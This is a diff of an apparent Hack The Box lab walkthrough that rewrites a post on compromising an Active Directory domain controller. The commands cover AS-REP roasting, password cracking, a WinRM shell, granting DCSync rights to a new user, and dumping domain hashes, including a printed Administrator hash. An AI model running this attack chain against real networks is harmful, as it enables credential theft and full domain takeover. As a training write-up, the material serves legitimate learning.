@@ -41,42 +41,51 @@
       
     </header>
     <div class="post-content">
-      <p>IP :  10.129.16.182</p>
-<h1 id="enumeration">Enumeration</h1>
-<h2 id="port-scanning">Port scanning</h2>
-<p>![[1.png]]</p>
-<p>LDAP enumeration  using LDAPsearch
-![[2.png]]
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Users,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Computers,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Domain Admins,CN=Users,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Domain Users,CN=Users,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Enterprise Admins,CN=Users,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Administrators,CN=Builtin,DC=htb,DC=local&rdquo;
-ldapsearch -x -H ldap://10.129.16.182 -b &ldquo;CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local&rdquo;</p>
-<p>Best and rapid LDAP enumeration using <a href="https://github.com/ropnop/windapsearch.git">https://github.com/ropnop/windapsearch.git</a></p>
-<p>![[3.png]]
-![[4.png]]
-![[5.png]]</p>
-<p>We found uncommon service account : ==CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local== This service requires that Kerberos pre-authentication be disabled in order to function.</p>
-<p>![[6.png]]
-Got the ash via ASREPRoasting
-hashcat -m 18200 hash.hash /usr/share/wordlists/rockyou.txt &ndash;force
-User : svc-alfresco
-password : s3rvice</p>
-<p>using
-evil-winrm -i 10.129.16.182 -u svc-alfresco -p s3rvice (port 5985)</p>
-<p>==Exchange Windows Permissions possède WriteDACL sur le domaine, ce qui permet — via Account Operators — d&rsquo;y ajouter un user et de lui accorder des droits DCSync pour dumper les hashes AD.==</p>
-<p>net user john abc123! /add /domain
-net group &ldquo;Exchange Windows Permissions&rdquo; john /add
-net localgroup &ldquo;Remote Management Users&rdquo; john /add</p>
-<p>next  we use powerview</p>
-<p>$pass = convertto-securestring &lsquo;abc123!&rsquo; -asplain -force
-$cred = new-object system.management.automation.pscredential(&lsquo;htb\john&rsquo;, $pass)
-Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync</p>
-<p>We use john&rsquo;s credentials (added to Exchange Windows Permissions) to grant ourselves DCSync rights via PowerView, which then allows us to dump all domain hashes.</p>
-<p>impacket-secretsdump <a href="mailto:htb/john@10.129.16.204">htb/john@10.129.16.204</a></p>
-<p>got the hash : htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</p>
+      <p><strong>Target IP:</strong> <code>10.129.16.182</code></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>The initial scan reveals the standard Active Directory service set (DNS, Kerberos, LDAP, SMB) confirming the target is a Windows domain controller.</p>
+<p><img src="1.png" alt="Nmap scan results"></p>
+<h3 id="ldap-enumeration">LDAP Enumeration</h3>
+<p>Anonymous LDAP binds are allowed, enabling enumeration of users, computers, and privileged groups without credentials.</p>
+<p><img src="2.png" alt="LDAP enumeration with ldapsearch"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Users,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Computers,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Domain Admins,CN=Users,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Domain Users,CN=Users,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Enterprise Admins,CN=Users,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Administrators,CN=Builtin,DC=htb,DC=local&#34;</span>
+</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.16.182 -b <span style="color:#e6db74">&#34;CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local&#34;</span>
+</span></span></code></pre></div><p>A faster and more readable alternative is <a href="https://github.com/ropnop/windapsearch.git">windapsearch</a>, which automates much of this enumeration.</p>
+<p><img src="3.png" alt="Windapsearch enumeration">
+<img src="4.png" alt="Windapsearch results">
+<img src="5.png" alt="Windapsearch group membership"></p>
+<p>This enumeration reveals an uncommon service account, <code>svc-alfresco</code>, located in the Service Accounts OU. The account has Kerberos pre-authentication disabled, making it vulnerable to AS-REP Roasting.</p>
+<p><img src="6.png" alt="AS-REP Roasting"></p>
+<h2 id="foothold">Foothold</h2>
+<p>The AS-REP hash is captured and cracked offline using the rockyou wordlist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">18200</span> hash.hash /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></div><p><strong>Credentials obtained:</strong></p>
+<ul>
+<li><strong>User:</strong> <code>svc-alfresco</code></li>
+<li><strong>Password:</strong> <code>s3rvice</code></li>
+</ul>
+<p>These credentials provide a shell via WinRM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.129.16.182 -u svc-alfresco -p s3rvice
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Further enumeration reveals that the <strong>Exchange Windows Permissions</strong> group holds <code>WriteDACL</code> rights over the domain object. Since <code>svc-alfresco</code> is a member of <strong>Account Operators</strong>, it can create a new domain user and add that user to the Exchange Windows Permissions group — effectively granting DCSync rights.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net user john abc123! /add /domain
+</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;Exchange Windows Permissions&#34;</span> john /add
+</span></span><span style="display:flex;"><span>net localgroup <span style="color:#e6db74">&#34;Remote Management Users&#34;</span> john /add
+</span></span></code></pre></div><p>Using PowerView, the newly created <code>john</code> account (now part of Exchange Windows Permissions) is granted DCSync rights directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$pass = convertto-securestring <span style="color:#e6db74">&#39;abc123!&#39;</span> -asplain -force
+</span></span><span style="display:flex;"><span>$cred = new-object system.management.automation.pscredential(<span style="color:#e6db74">&#39;htb\john&#39;</span>, $pass)
+</span></span><span style="display:flex;"><span>Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+</span></span></code></pre></div><p>With DCSync rights in place, all domain password hashes can be dumped remotely:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump htb/john@10.129.16.204
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<pre tabindex="0"><code>htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+</code></pre><p>This hash can be used directly for a Pass-the-Hash attack to gain full administrative access to the domain controller.</p>
 
     </div>
     <footer class="post-footer">
